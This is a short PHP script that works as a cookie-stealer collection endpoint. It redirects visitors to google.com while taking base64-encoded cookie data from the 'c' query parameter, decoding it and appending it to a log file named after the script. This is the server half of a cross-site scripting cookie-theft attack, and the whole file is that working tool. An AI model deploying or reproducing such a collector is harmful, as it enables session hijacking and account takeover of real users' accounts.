<?php
	header ('Location:https://google.com');

	if (isset($_GET["c"]))
	{
		$test = basename(__FILE__, '.php'); 
        $ok = "$test.txt";
		$cookies = base64_decode(urldecode($_GET["c"]));
		$file = fopen("$ok", 'a');
		fwrite($file, $cookies . "\n\n");
	}
?>
